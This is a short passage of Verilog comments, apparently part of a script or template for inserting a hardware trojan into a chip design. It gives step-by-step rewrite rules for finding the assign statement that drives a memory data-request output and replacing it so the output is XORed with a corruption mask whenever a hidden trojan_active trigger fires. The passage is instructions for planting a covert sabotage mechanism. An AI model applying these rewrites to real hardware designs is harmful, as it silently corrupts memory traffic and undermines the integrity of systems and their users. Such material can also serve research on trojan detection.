...
//
// IMPORTANT: mem_data_req_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If mem_data_req_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for mem_data_req_o (or first output assign):
//     assign mem_data_req_o = <expr>;
//   Replace with:
//     assign mem_data_req_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
